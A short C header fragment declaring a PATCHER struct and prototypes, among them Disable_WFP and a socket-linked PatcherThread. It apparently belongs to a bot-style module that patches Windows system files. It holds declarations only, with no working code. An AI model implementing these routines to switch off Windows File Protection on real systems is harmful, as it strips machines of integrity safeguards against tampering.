typedef struct PATCHER
{
	SOCKET sock;
	int threadnum;
	char path[MAX_PATH];
	int version;
	BOOL notice;
	BOOL gotinfo;

} PATCHER;


BOOL checkos();
BOOL backup(char szPath[MAX_PATH]);
void Disable_WFP(char *szFile);
DWORD WINAPI PatcherThread(LPVOID param);